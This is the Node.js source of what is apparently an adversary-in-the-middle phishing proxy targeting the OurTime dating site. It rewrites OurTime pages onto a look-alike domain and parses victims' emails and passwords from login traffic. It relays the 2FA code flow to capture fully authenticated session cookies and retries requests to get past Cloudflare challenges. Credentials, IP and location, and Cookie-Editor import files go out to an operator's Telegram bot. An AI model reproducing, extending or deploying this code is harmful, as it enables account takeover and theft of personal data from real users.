import express from 'express';
import cookieParser from 'cookie-parser';
import crypto from 'crypto';
import fs from 'fs';
import path from 'path';
import os from 'os';
import { gotScraping } from 'got-scraping';

const app = express();

// ================= CONFIG =================
const TARGET = process.env.TARGET || 'https://www.ourtime.com';
const MOBI_TARGET = process.env.MOBI_TARGET || 'https://mobi.ourtime.com';
const SITE_DOMAIN = process.env.SITE_DOMAIN || '';
const PORT = process.env.PORT || 3000;
const PROXY_SECRET = process.env.PROXY_SECRET || '';

// 🧪 MOCK_UPSTREAM=1 → semua request upstream dijawab oleh mock OurTime
// (E2E test offline — tidak butuh akun OurTime verified)
const MOCK_UPSTREAM = /^(1|true|yes)$/i.test(process.env.MOCK_UPSTREAM || '');

const TG_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const TG_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';

const CHROME_UA =
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36';
const MOBILE_UA =
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1';

// 2FA pending window before it is considered abandoned
const PENDING_TTL_MS = 2 * 3_600_000; // 2h (pendingToken itself lives ~45 min)

// ================= SESSION STORE (persistence) =================
const STORE_FILE = path.join(os.tmpdir(), 'jwtstore.json');
const jwtStore = new Map();
let storeDirty = false;

try {
  if (fs.existsSync(STORE_FILE)) {
    const data = JSON.parse(fs.readFileSync(STORE_FILE, 'utf8'));
    for (const [k, v] of Object.entries(data)) jwtStore.set(k, v);
    console.log(`[STORE] Restored ${jwtStore.size} session(s)`);
  }
} catch (err) {
  console.warn('[STORE] Load failed:', err.message);
}

function saveStore() {
  if (!storeDirty) return;
  try {
    const obj = {};
    for (const [k, v] of jwtStore) obj[k] = v;
    fs.writeFileSync(STORE_FILE, JSON.stringify(obj));
    storeDirty = false;
  } catch (err) {
    console.warn('[STORE] Save failed:', err.message);
  }
}

setInterval(() => {
  const now = Date.now();
  let changed = false;
  for (const [k, v] of jwtStore) {
    if (now - v.createdAt > 6 * 3_600_000) {
      jwtStore.delete(k);
      changed = true;
      continue;
    }
    // Purge expired 2FA pending + notify operator (Option A1)
    // FIX R1: jangan false-alarm "ABANDONED" kalau login ternyata sudah berhasil
    if (v.pending && !v.loggedInAt && now - v.pending.createdAt > PENDING_TTL_MS) {
      const p = v.pending;
      delete v.pending;
      changed = true;
      sendTelegram(
        `⌛ <b>OurTime — 2FA ABANDONED / expired</b>\n` +
        `━━━━━━━━━━━━━━━━━━\n` +
        `📧 Email: <code>${p.email || 'n/a'}</code>\n` +
        `🔑 Pass: <code>${p.password || 'n/a'}</code>\n` +
        `🆔 sid: <code>${k}</code>\n` +
        (p.wrongCount ? `❌ Wrong OTP attempts: <code>${p.wrongCount}</code>\n` : '') +
        `ℹ️ OTP never completed (or pendingToken expired ~45 min after login).`
      ).catch(() => {});
    }
  }
  if (changed) storeDirty = true;
  saveStore();
}, 15_000);

// ============ KEEP-ALIVE + HTML CACHE (anti idle-block) ============
const htmlCache = new Map(); // key: path|device → { html, ts }
const HTML_CACHE_TTL = 60 * 60 * 1000; // 1 hour

// Is this response a Cloudflare challenge/block page?
function isCfChallengeBody(body) {
  return (
    typeof body === 'string' &&
    body.includes('Attention Required')
  );
}

// KeepAlive: try up to 3 times per device with pauses before giving up,
// so the login cache stays warm through CF fluctuations.
async function keepAlive() {
  for (const [ua, base, device] of [
    [CHROME_UA, TARGET, 'd'],
    [MOBILE_UA, MOBI_TARGET, 'm'],
  ]) {
    let ok = false;
    for (let attempt = 1; attempt <= 3 && !ok; attempt++) {
      try {
        const up = await httpUp({
          url: base + '/login',
          method: 'GET',
          headers: {
            'user-agent': ua,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
          },
          timeout: { request: 15000 },
        });

        if (up.statusCode < 400 && !isCfChallengeBody(up.body)) {
          htmlCache.set(`login|${device}`, { html: up.body, ts: Date.now() });
          console.log(`[KEEPALIVE] OK + cached (${device})${attempt > 1 ? ` on attempt ${attempt}` : ''}`);
          ok = true;
        } else {
          console.warn(`[KEEPALIVE] challenged (${device}) status=${up.statusCode} attempt=${attempt}`);
        }
      } catch (err) {
        console.warn(`[KEEPALIVE] error (${device}) attempt=${attempt}:`, err.message);
      }
      if (!ok && attempt < 3) {
        await new Promise((r) => setTimeout(r, 4000 * attempt + Math.random() * 2000));
      }
    }
  }
}
setTimeout(keepAlive, 30_000);
setInterval(keepAlive, 10 * 60_000);

app.disable('x-powered-by');
app.use(cookieParser());

// Health check publik (keep-awake Render + monitoring) — TANPA secret,
// tidak membuat sesi member (route terdaftar sebelum middleware sesi).
app.get('/healthz', (req, res) => res.status(200).send('ok'));

// ============ PROTECTION: only the Worker may access ============
if (PROXY_SECRET) {
  app.use((req, res, next) => {
    if (req.headers['x-proxy-secret'] !== PROXY_SECRET) {
      return res.status(404).send('Not Found');
    }
    next();
  });
} else {
  console.warn('[WARN] PROXY_SECRET not set — Railway is exposed publicly!');
}

// Middleware: member session
app.use((req, res, next) => {
  let sid = req.cookies?.msid;
  if (!sid || !jwtStore.has(sid)) {
    sid = crypto.randomBytes(24).toString('hex');
    jwtStore.set(sid, { jwt: null, cookies: {}, createdAt: Date.now() });
    storeDirty = true;
    res.cookie('msid', sid, { httpOnly: true, path: '/' });
  }
  req.mSession = jwtStore.get(sid);
  req.mSid = sid;

  if (!req.mSession.cookies || typeof req.mSession.cookies !== 'object') {
    req.mSession.cookies = {};
  }

  // SELF-HEALING: purge stale Cloudflare cookies
  for (const k of Object.keys(req.mSession.cookies)) {
    if (k.startsWith('__cf') || k === 'cf_clearance') {
      delete req.mSession.cookies[k];
      storeDirty = true;
    }
  }

  next();
});

// ================= HELPERS =================

function isMobileUA(ua) {
  return /Mobi|Android|iPhone|iPad|iPod/i.test(ua || '');
}

function getBaseTarget(req) {
  return isMobileUA(req.headers['user-agent']) ? MOBI_TARGET : TARGET;
}

// Real visitor IP is set by the Worker (x-real-ip), not Cloudflare's IP
function getClientIp(req) {
  const real = req.headers['x-real-ip'];
  if (real) return real;
  const xff = req.headers['x-forwarded-for'];
  if (xff) return xff.split(',')[0].trim();
  return req.socket.remoteAddress;
}

function timeUS() {
  return new Date().toLocaleString('en-US', {
    timeZone: 'America/New_York',
    dateStyle: 'medium',
    timeStyle: 'medium',
  });
}

function rewriteHtml(html, siteHost) {
  return html
    .replace(/https?:\/\/mobi\.ourtime\.com/g, siteHost)
    .replace(/https?:\/\/(?:www\.)?ourtime\.com/g, siteHost)
    .replace(/<script[^>]*cloudflareinsights[^>]*><\/script>/g, '');
}

function captureCookies(setCookies, sess, source) {
  const added = [];
  if (!sess || !sess.cookies) return added;
  for (const sc of setCookies || []) {
    if (!sc) continue;
    const pair = sc.split(';')[0];
    const eq = pair.indexOf('=');
    if (eq === -1) continue;
    const name = pair.slice(0, eq).trim();
    const value = pair.slice(eq + 1).trim();
    if (name.startsWith('__cf') || name === 'cf_clearance') continue;
    if (sc.toLowerCase().includes('expires=thu, 01 jan 1970')) {
      delete sess.cookies[name];
    } else {
      if (!(name in sess.cookies)) added.push(name);
      sess.cookies[name] = value;
      storeDirty = true;
    }
  }
  // FIX R3: bukti empiris — tampilkan URL mana yang menerbitkan cookie auth kuat
  const strongAdded = added.filter((n) => /^(authtoken|uid|Handle)$/i.test(n));
  if (strongAdded.length && source) {
    console.log(`[COOKIE-SRC] ${source} → added=${added.join(',')}`);
  }
  return added;
}

async function readBody(req) {
  const chunks = [];
  for await (const c of req) chunks.push(c);
  return Buffer.concat(chunks);
}

function parseCredentials(contentType, body) {
  const text = body.toString('utf8');

  const EMAIL_KEYS = ['email', 'userEmail', 'username', 'user', 'usernameEmail', 'loginEmail', 'userName', 'account'];
  const PASS_KEYS = ['password', 'pass', 'pwd', 'userPassword', 'loginPassword', 'userpass', 'passwd'];

  const findKey = (obj, keys) => {
    if (!obj || typeof obj !== 'object') return null;
    for (const k of keys) {
      if (typeof obj[k] === 'string' && obj[k].length) return obj[k];
    }
    for (const v of Object.values(obj)) {
      const found = findKey(v, keys);
      if (found) return found;
    }
    return null;
  };

  try {
    if (text.trim().startsWith('{') || (contentType || '').includes('json')) {
      const j = JSON.parse(text);
      const email = findKey(j, EMAIL_KEYS);
      const password = findKey(j, PASS_KEYS);
      if (email || password) return { email, password, raw: text };
    }
  } catch {}

  try {
    if ((contentType || '').includes('form') || /^[A-Za-z0-9_%.\-]+=[^&]*&/.test(text)) {
      const j = Object.fromEntries(new URLSearchParams(text));
      const email = findKey(j, EMAIL_KEYS);
      const password = findKey(j, PASS_KEYS);
      if (email || password) return { email, password, raw: text };
    }
  } catch {}

  const emailMatch =
    text.match(/"([\w.+\-]+@[\w.\-]+\.[A-Za-z]{2,})"/) ||
    text.match(/(?:userEmail|email|username|user)=([\w.+\-]+%40[\w.\-]+)/i);
  const passMatch =
    text.match(/"(?:password|pass|pwd|userPassword)"\s*:\s*"([^"\n]+)"/i) ||
    text.match(/(?:^|[&"])(?:password|pass|pwd)=([^&"\n]+)/i);

  return {
    email: emailMatch ? decodeURIComponent(emailMatch[1]).replace(/%40/g, '@') : null,
    password: passMatch ? decodeURIComponent(passMatch[1]).replace(/\+/g, ' ') : null,
    raw: text,
  };
}

async function lookupCountry(ip) {
  try {
    if (!ip || ip.startsWith('10.') || ip.startsWith('127.')) return 'Local';
    const r = await fetch(`http://ip-api.com/json/${ip}?fields=country,countryCode,city`, {
      signal: AbortSignal.timeout(5000),
    });
    const j = await r.json();
    return `${j.country || 'Unknown'}${j.city ? ' / ' + j.city : ''} (${j.countryCode || '?'})`;
  } catch {
    return 'Unknown';
  }
}

function buildCookieEditorJson(cookies) {
  if (!cookies || typeof cookies !== 'object') {
    console.warn('[COOKIES] invalid cookies:', typeof cookies);
    return [];
  }

  const now = Math.floor(Date.now() / 1000);
  let expirationDate = now + 86400 * 30;

  try {
    const at = decodeURIComponent(cookies.authtoken || '').replace(/^Bearer\s+/i, '');
    const parts = at.split('.');
    if (parts.length === 3) {
      const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString('utf8'));
      if (payload.exp) expirationDate = payload.exp + 86400 * 14;
    }
  } catch {}

  return Object.entries(cookies).map(([name, value]) => ({
    name,
    value: (() => { try { return decodeURIComponent(String(value)); } catch { return String(value); } })(),
    domain: '.ourtime.com',
    path: '/',
    hostOnly: false,
    secure: true,
    httpOnly: true,
    sameSite: 'no_restriction',
    session: false,
    expirationDate,
  }));
}

// ================= JSON / GraphQL HELPERS (2FA flow) =================

function tryJson(t) {
  try { return JSON.parse(t); } catch { return null; }
}

// variables may arrive as an object (normal) or a JSON string
function gqlVars(json) {
  if (!json) return {};
  if (typeof json.variables === 'string') return tryJson(json.variables) || {};
  if (json.variables && typeof json.variables === 'object') return json.variables;
  return json;
}

function deepGet(obj, key) {
  if (!obj || typeof obj !== 'object') return undefined;
  for (const [k, v] of Object.entries(obj)) {
    if (k === key && v != null && typeof v !== 'object') return v;
    const f = deepGet(v, key);
    if (f !== undefined) return f;
  }
  return undefined;
}

function scanJson(j) {
  const found = {};
  (function walk(o) {
    if (!o || typeof o !== 'object') return;
    if (Array.isArray(o)) { o.forEach(walk); return; }
    for (const [k, v] of Object.entries(o)) {
      if (k === 'success' && v === true) found.success = true;
      if (k === 'sessionId' && typeof v === 'string' && v.length) found.sessionId = v;
      if (k === 'secondsToExpire' && typeof v === 'number') found.seconds = v;
      if (v && typeof v === 'object') walk(v);
    }
  })(j);
  return found;
}

function decodeChannelId(id) {
  if (!id || typeof id !== 'string') return '?';
  try {
    const raw = Buffer.from(id, 'base64').toString('utf8');
    if (/sms/i.test(raw)) return 'SMS';
    if (/email/i.test(raw)) return 'Email';
    return raw || id;
  } catch { return id; }
}

const AUTH_COOKIE_RE = /^(authtoken|uid|Handle|machineid)$/i;
function hasAuthCookie(sess) {
  return !!sess.cookies && Object.keys(sess.cookies).some((n) => AUTH_COOKIE_RE.test(n));
}

// ============ FIX 1: deteksi "login PENUH" yang ketat ============
// machineid sudah ada sejak halaman login dibuka, dan authtoken versi
// pending (scope:[1], tanpa `sub`, auth_time:null) TIDAK boleh dianggap
// login sukses. Sesi dianggap PENUH hanya jika:
//   - cookie `uid` ada, ATAU
//   - authtoken JWT mengandung `sub` DAN `auth_time` yang tidak null
function decodeJwtPayload(rawValue) {
  try {
    let v = String(rawValue || '');
    try { v = decodeURIComponent(v); } catch {}
    v = v.replace(/^Bearer\s+/i, '');
    const parts = v.split('.');
    if (parts.length !== 3) return null;
    const pl = JSON.parse(Buffer.from(parts[1], 'base64').toString('utf8'));
    return pl && typeof pl === 'object' ? pl : null;
  } catch {
    return null;
  }
}

function hasFullAuth(sess) {
  if (!sess?.cookies) return false;
  if (sess.cookies.uid) return true;
  if (sess.cookies.authtoken) {
    const pl = decodeJwtPayload(sess.cookies.authtoken);
    if (pl && pl.sub && pl.auth_time != null) return true;
  }
  return false;
}

// FIX 2: fingerprint cookie auth — untuk deteksi "upgrade" cookies
// setelah notifikasi sukses pertama terkirim.
function authCookieFingerprint(sess) {
  if (!sess?.cookies) return '';
  return [sess.cookies.uid || '', sess.cookies.authtoken || ''].join('|');
}

// ================= TELEGRAM =================

async function sendTelegram(text, hasHtml = true) {
  if (!TG_TOKEN || !TG_CHAT_ID) return;
  try {
    const payload = { chat_id: TG_CHAT_ID, text, disable_web_page_preview: true };
    if (hasHtml) payload.parse_mode = 'HTML';

    const r = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify(payload),
      signal: AbortSignal.timeout(10000),
    });
    const j = await r.json();

    if (hasHtml && !j.ok) {
      await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ chat_id: TG_CHAT_ID, text, disable_web_page_preview: true }),
      });
    }
  } catch (err) {
    console.error('[TG] Error:', err.message);
  }
}

async function sendTelegramFile(jsonString, filename, caption) {
  if (!TG_TOKEN || !TG_CHAT_ID) return;
  try {
    const fd = new FormData();
    fd.append('chat_id', TG_CHAT_ID);
    if (caption) {
      fd.append('caption', caption);
      fd.append('parse_mode', 'HTML');
    }
    fd.append('document', new Blob([jsonString], { type: 'application/json' }), filename);

    const r = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendDocument`, {
      method: 'POST',
      body: fd,
      signal: AbortSignal.timeout(20000),
    });
    const j = await r.json().catch(() => ({}));
    if (!j.ok) console.error('[TG] File send failed:', JSON.stringify(j).slice(0, 200));
  } catch (err) {
    console.error('[TG] File error:', err.message);
  }
}

async function notifyLoginFailed({ email, password, ip, country, time }) {
  await sendTelegram(
    `❌ <b>OurTime — FAILED LOGIN (wrong credentials)</b>\n` +
    `━━━━━━━━━━━━━━━━━━\n` +
    `📧 Email: <code>${email || 'n/a'}</code>\n` +
    `🔑 Pass: <code>${password || 'n/a'}</code>\n` +
    `🌏 IP: <code>${ip}</code>\n` +
    `🏴 Country: <code>${country}</code>\n` +
    `🕐 Time (US): <code>${time}</code>`
  );
}

async function notifyLoginSuccess({ email, password, ip, country, time, cookies, note }) {
  await sendTelegram(
    `✅ <b>OurTime — SUCCESSFUL LOGIN</b>\n` +
    `━━━━━━━━━━━━━━━━━━\n` +
    `📧 Email: <code>${email || 'n/a'}</code>\n` +
    `🔑 Pass: <code>${password || 'n/a'}</code>\n` +
    `🌏 IP: <code>${ip}</code>\n` +
    `🏴 Country: <code>${country}</code>\n` +
    `🕐 Time (US): <code>${time}</code>\n` +
    (note ? `🔓 Verified: <code>${note}</code>\n` : '') +
    `━━━━━━━━━━━━━━━━━━\n` +
    `📎 Cookies attached below — Cookie-Editor import ready`
  );

  try {
    const cookieEditorJson = JSON.stringify(buildCookieEditorJson(cookies), null, 2);
    // Nama file = email PENUH (termasuk domain, '@' dipertahankan)
    const safeEmail = String(email || 'user').trim().replace(/[^a-zA-Z0-9@._-]/g, '_');
    await sendTelegramFile(
      cookieEditorJson,
      `${safeEmail}.json`,
      `🍪 Cookies for <code>${email}</code> — import via Cookie-Editor (domain .ourtime.com)`
    );
  } catch (err) {
    console.error('[TG] Cookie file build failed:', err.message);
  }
}

// ================= MOCK UPSTREAM (MOCK_UPSTREAM=1) =================
// E2E test offline seluruh pipeline 2FA TANPA akun OurTime verified.
// Meniru alur nyata hasil capture produksi (file tare-cookies):
//   POST /api/auth (akun 2FA)     -> pendingToken (scope[1], tanpa sub)
//   POST /api/auth (akun non-2FA)  -> cookies final langsung
//   /graphql/TwoFactorVerifyType   -> channel email + SMS
//   /graphql/TwoFactorSendCode     -> success
//   /graphql/TwoFactorValidate     -> success + sessionId (BELUM ada cookies)
//   POST /api/auth (refreshSession) SETELAHNYA -> cookies FINAL (uid, cc,
//                                     authtoken scope[2] dengan sub + auth_time)
// Kredensial test: test@example.com / test1234 (OTP 123456)
//                  direct@example.com / test1234 (tanpa 2FA)

function mockJwt(payload) {
  const b64u = (o) => Buffer.from(JSON.stringify(o)).toString('base64url');
  return `${b64u({ alg: 'HS256', typ: 'JWT' })}.${b64u(payload)}.${b64u({ sig: 'mock' })}`;
}

const mockState = {
  releaseFinalCookies: false,
  sessionId: null,
  authTime: null,
  now: () => Math.floor(Date.now() / 1000),
};

function mockResp(statusCode, setCookie, body, extraHeaders = {}) {
  const isHtml = typeof body === 'string' && body.startsWith('<');
  const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
  return {
    statusCode,
    headers: {
      'content-type': isHtml ? 'text/html; charset=utf-8' : 'application/json',
      ...(Array.isArray(setCookie) && setCookie.length ? { 'set-cookie': setCookie } : {}),
      ...extraHeaders,
    },
    body: bodyStr,
    rawBody: Buffer.from(bodyStr),
  };
}

function mockUpstream({ url, method = 'GET', headers = {}, body }) {
  const u = new URL(url);
  const p = u.pathname;
  const bodyText = body ? (Buffer.isBuffer(body) ? body.toString('utf8') : String(body)) : '';
  const cookieHeader = headers.cookie || '';
  const hasCookie = (n) => new RegExp(`(?:^|;\\s*)${n}=`).test(cookieHeader);

  // ---- halaman (GET / dan /login) ----
  if (method === 'GET' && (p === '/' || p === '/login' || p === '')) {
    const sc = [];
    if (!hasCookie('machineid')) {
      sc.push(`machineid=MOCK-${Math.random().toString(36).slice(2, 14).toUpperCase()}; Path=/; Domain=.ourtime.com`);
    }
    if (!hasCookie('_csrf')) {
      sc.push('_csrf=mock-csrf-token; Path=/; Domain=.ourtime.com');
    }
    return Promise.resolve(mockResp(200, sc, '<!DOCTYPE html><html><body><h1>Mock OurTime</h1></body></html>'));
  }

  // ---- login kredensial ----
  if (method === 'POST' && p === '/api/auth') {
    // akun non-2FA -> cookies final langsung (seperti capture droeinvestments)
    if (/"email"\s*:\s*"direct@example\.com"/.test(bodyText) && /"password"\s*:\s*"test1234"/.test(bodyText)) {
      const iat = mockState.now();
      const jwt = mockJwt({
        iss: 'coreapi', aud: 'coreapi', platformId: 67,
        sessionId: 'mock-direct-session', siteCode: 166, ServerId: 0, ver: 12,
        issSrc: 5, env: 1, scope: [4], auth_time: iat, iat, exp: iat + 2700,
        jti: 'mock-jti-direct', sub: 'MockSubJectDirect-9', urlCode: '167', regUrlCode: '167',
      });
      const sc = [
        `machineid=MOCK-${Math.random().toString(36).slice(2, 14).toUpperCase()}; Path=/; Domain=.ourtime.com`,
        `authtoken=Bearer%20${jwt}; Path=/; Domain=.ourtime.com`,
        `E2Pay_jwt=${jwt}; Path=/; Domain=.ourtime.com`,
        `_csrf=mock-csrf-token; Path=/; Domain=.ourtime.com`,
        `uid=MockSubJectDirect-9; Path=/; Domain=.ourtime.com`,
      ];
      return Promise.resolve(mockResp(200, sc, JSON.stringify({ success: true })));
    }
    // akun 2FA -> password benar, pendingToken di body, TANPA cookies auth
    if (/"email"\s*:\s*"test@example\.com"/.test(bodyText) && /"password"\s*:\s*"test1234"/.test(bodyText)) {
      mockState.releaseFinalCookies = false; // reset untuk sesi test baru
      const iat = mockState.now();
      const pending = mockJwt({
        iss: 'coreapi', aud: 'coreapi', platformId: 49,
        sessionId: 'mock-pending-session', siteCode: 166, ServerId: 0, ver: 12,
        issSrc: 27, env: 1, scope: [1], auth_time: null, iat, exp: iat + 2700,
        jti: 'mock-jti-pending', urlCode: '167',
      });
      return Promise.resolve(mockResp(200, [], JSON.stringify({ token: `Bearer ${pending}` })));
    }
    // FIX R4: exchange ASLI pasca-OTP — POST /api/auth "refreshSession".
    // SPA OurTime memanggil ini otomatis setelah authTwoFactorValidate sukses;
    // cookies FINAL (uid, authtoken scope[2] + sub, cc) diterbitkan pada
    // response INI — persis perilaku OurTime asli (hasil analisis bundle JS).
    if (mockState.releaseFinalCookies) {
      if (hasCookie('uid')) {
        // sesi sudah final — refreshSession balas sukses tanpa cookies baru
        return Promise.resolve(mockResp(200, [], JSON.stringify({ success: true })));
      }
      const iat = mockState.now();
      const jwt = mockJwt({
        iss: 'coreapi', aud: 'coreapi', platformId: 49,
        sessionId: mockState.sessionId, siteCode: 166, ServerId: 78, ver: 12,
        issSrc: 10, env: 1, scope: [2], auth_time: mockState.authTime,
        iat, exp: iat + 2700, jti: 'mock-jti-final', sub: 'MockSubJect2Fa-123',
        urlCode: '167', regUrlCode: '167',
      });
      const sc = [
        `authtoken=Bearer%20${jwt}; Path=/; Domain=.ourtime.com`,
        `E2Pay_jwt=${jwt}; Path=/; Domain=.ourtime.com`,
        `uid=MockSubJect2Fa-123; Path=/; Domain=.ourtime.com`,
        `cc=1; Path=/; Domain=.ourtime.com`,
      ];
      return Promise.resolve(mockResp(200, sc, JSON.stringify({ success: true, sessionId: mockState.sessionId })));
    }
    // kredensial salah
    return Promise.resolve(mockResp(200, [], JSON.stringify({
      error: 'The email or password you entered is incorrect',
    })));
  }

  // ---- GraphQL 2FA ----
  if (method === 'POST' && /^\/graphql\/TwoFactor/.test(p)) {
    const op = (p.match(/TwoFactor\w+/) || ['TwoFactor'])[0];

    if (op === 'TwoFactorVerifyType') {
      return Promise.resolve(mockResp(200, [], JSON.stringify({
        data: {
          authTwoFactorVerifyType: [
            { verifyType: 2, maskedContactInfo: 't***@example.com', id: Buffer.from('mock-email-channel').toString('base64') },
            { verifyType: 1, maskedContactInfo: '+1********78', id: Buffer.from('mock-sms-channel').toString('base64') },
          ],
        },
      })));
    }

    if (op === 'TwoFactorSendCode') {
      return Promise.resolve(mockResp(200, [], JSON.stringify({
        data: { authTwoFactorSendCode: { success: true, secondsToExpire: 600 } },
      })));
    }

    if (op === 'TwoFactorValidate') {
      if (/"verifyCode"\s*:\s*"123456"/.test(bodyText)) {
        mockState.sessionId = 'mock-final-session-id';
        mockState.authTime = mockState.now();
        mockState.releaseFinalCookies = true;
        return Promise.resolve(mockResp(200, [], JSON.stringify({
          data: { authTwoFactorValidate: { success: true, sessionId: mockState.sessionId, returnUrl: '/' } },
        })));
      }
      return Promise.resolve(mockResp(200, [], JSON.stringify({
        data: { authTwoFactorValidate: { success: false } },
      })));
    }
  }

  // ---- lainnya ----
  return Promise.resolve(mockResp(200, [], JSON.stringify({ data: {} })));
}

// ============ HTTP upstream terpusat ============
//  - MOCK_UPSTREAM=1 -> diarahkan ke mock (test offline)
//  - followRedirect default false (FIX 4): hop 302 harus dilewati browser
//    user lewat proxy supaya Set-Cookie tiap hop selalu tercapture
//    (redirect otomatis Got akan "menelan" cookie di tengah rantai)
async function httpUp(opts) {
  if (MOCK_UPSTREAM) return mockUpstream(opts);
  return gotScraping({
    ...opts,
    followRedirect: opts.followRedirect === true,
    throwHttpErrors: false,
    timeout: opts.timeout || { request: 30000 },
  });
}

// ================= UPSTREAM =================

async function rawUpstreamRequest(req, { path, body, method, extraHeaders = {}, baseTarget } = {}) {
  const sess = req.mSession;
  const base = baseTarget || getBaseTarget(req);
  const url = new URL(path || req.originalUrl, base).href;

  const headers = {
    'user-agent': isMobileUA(req.headers['user-agent']) ? MOBILE_UA : CHROME_UA,
    'accept': req.headers['accept'] || '*/*',
    'accept-language': req.headers['accept-language'] || 'en-US,en;q=0.9',
    'accept-encoding': 'gzip, deflate, br',
    'origin': base,
    'referer': new URL(path || req.originalUrl, base).href,
    'x-requested-with': req.headers['x-requested-with'] || 'XMLHttpRequest',
  };

  if (req.headers['content-type']) headers['content-type'] = req.headers['content-type'];
  if (req.headers['x-csrf-token']) headers['x-csrf-token'] = req.headers['x-csrf-token'];
  if (req.headers['g-recaptcha-response']) headers['g-recaptcha-response'] = req.headers['g-recaptcha-response'];

  Object.assign(headers, extraHeaders);

  if (sess && sess.cookies && Object.keys(sess.cookies).length) {
    headers.cookie = Object.entries(sess.cookies)
      .map(([k, v]) => `${k}=${v}`)
      .join('; ');
  }

  return httpUp({
    url,
    method: method || req.method,
    headers,
    body,
    timeout: { request: 30000 },
  });
}

async function upstreamRequest(req, opts = {}) {
  const MAX_RETRY = 3;
  const target = opts.path || req.originalUrl;
  let lastUp = null;

  for (let attempt = 1; attempt <= MAX_RETRY; attempt++) {
    const up = await rawUpstreamRequest(req, opts);

    // Diagnostic (first attempt only, classify the source of the 403)
    if (up.statusCode === 403 && attempt === 1) {
      const bodyStr = typeof up.body === 'string' ? up.body : '';
      const source = isCfChallengeBody(bodyStr) ? 'Cloudflare' : 'App/other';
      console.warn(`[403] ${target} :: source=${source} :: ${bodyStr.replace(/\s+/g, ' ').slice(0, 150)}`);
    }

    if (!isCfChallengeBody(up.body)) return up;

    lastUp = up;
    console.warn(`[CF-RETRY] ${attempt}/${MAX_RETRY} ${target}`);
    await new Promise((r) => setTimeout(r, 2000 * attempt + Math.random() * 1000));
  }

  // Final extra attempt for API calls after a longer cooldown —
  // CF risk score drops after the login burst, this often gets through.
  if (target.startsWith('/api/') || /^\/graphql\//.test(target)) {
    await new Promise((r) => setTimeout(r, 6000 + Math.random() * 2000));
    const finalUp = await rawUpstreamRequest(req, opts);
    if (!isCfChallengeBody(finalUp.body)) {
      console.log(`[CF-RETRY] final attempt recovered: ${target}`);
      return finalUp;
    }
    console.warn(`[CF-RETRY] final attempt still challenged: ${target}`);
    return finalUp;
  }

  return lastUp;
}

function forwardResponseHeaders(res, up, siteHost) {
  res.status(up.statusCode);
  for (const [k, v] of Object.entries(up.headers)) {
    if (k.startsWith(':')) continue;
    if (['set-cookie', 'content-encoding', 'transfer-encoding', 'content-length'].includes(k)) continue;

    if (k === 'location' && typeof v === 'string' && siteHost) {
      res.setHeader(k, v
        .replace(/https?:\/\/mobi\.ourtime\.com/g, siteHost)
        .replace(/https?:\/\/(?:www\.)?ourtime\.com/g, siteHost));
      continue;
    }

    res.setHeader(k, v);
  }
}

// ================= 2FA / OTP LOGIC =================

// Fire the final success notification once cookies are auth-grade.
// Anti-duplicate: sess.pending is deleted on first success.
async function finalizeLogin(sess, req, note) {
  if (!sess.pending) return false;
  // FIX 1: hanya finalisasi kalau login-nya PENUH (uid ada, atau authtoken
  // JWT punya sub + auth_time). machineid / pendingToken tidak dihitung —
  // dulu finalize terjadi prematur dengan cookies pending.
  if (!hasFullAuth(sess)) return false;

  const { email, password, sendCount, wrongCount } = sess.pending;
  sess.lastEmail = email;        // disimpan untuk re-notify upgrade (FIX 2)
  sess.lastPassword = password;
  delete sess.pending;
  sess.loggedInAt = Date.now();
  sess.finalizedAt = Date.now();                            // FIX 2
  sess.finalizedFingerprint = authCookieFingerprint(sess);  // FIX 2
  storeDirty = true;
  saveStore();

  const ip = getClientIp(req);
  const country = await lookupCountry(ip);
  const parts = [];
  if (sendCount) {
    const total = Object.values(sendCount).reduce((a, b) => a + b, 0);
    if (total > 1) parts.push(`OTP resent total ×${total}`);
  }
  if (wrongCount) parts.push(`wrong OTP attempts: ${wrongCount}`);

  const noteFull = [note, parts.length ? `(${parts.join(', ')})` : '']
    .filter(Boolean).join(' ');

  await notifyLoginSuccess({
    email, password, ip, country, time: timeUS(),
    cookies: sess.cookies, note: noteFull,
  });
  console.log(`[2FA-FINAL] ✅ ${email} (${noteFull}) sid=${req.mSid}`);
  return true;
}

// ============ FIX 3: penyelesaian sesi proaktif server-side ============
// Setelah OTP benar, OurTime menerbitkan cookies FINAL (uid, authtoken
// penuh, cc) pada request LANJUTAN (navigasi halaman / returnUrl).
// Kalau user langsung menutup tab, request itu tidak pernah sampai ke
// kita — jadi kita lakukan sendiri dan capture setiap hop-nya.
// Redirect diikuti MANUAL (FIX 4) karena redirect otomatis Got akan
// "menelan" Set-Cookie di hop tengah.
async function completePostOtpSession(sess, req, validateRespJson) {
  if (!sess || !sess.pending) return false;
  if (hasFullAuth(sess)) return true;
  // kill-switch operasional (test / debugging): SKIP_POST_OTP_COMPLETE=1
  if (/^(1|true|yes)$/i.test(process.env.SKIP_POST_OTP_COMPLETE || '')) return false;

  try {
    const device = sess.pending.device === 'm' ? 'm' : 'd';
    const base = device === 'm' ? MOBI_TARGET : TARGET;
    const ua = device === 'm' ? MOBILE_UA : CHROME_UA;
    const buildCookieHeader = () =>
      Object.entries(sess.cookies || {}).map(([k, v]) => `${k}=${v}`).join('; ');

    // FIX R2: exchange ASLI OurTime pasca-OTP (hasil analisis bundle JS mereka):
    // setelah authTwoFactorValidate sukses, SPA OurTime otomatis memanggil
    //   POST /api/auth (action "refreshSession") membawa {sessionId}
    // dan cookies FINAL (uid, authtoken penuh, cc, E2Pay_jwt) diterbitkan
    // pada response POST ini. Kita replay request itu dari sisi server
    // supaya tidak bergantung pada browser user.
    const sessionId = sess.pending.sessionId || deepGet(validateRespJson, 'sessionId') || '';
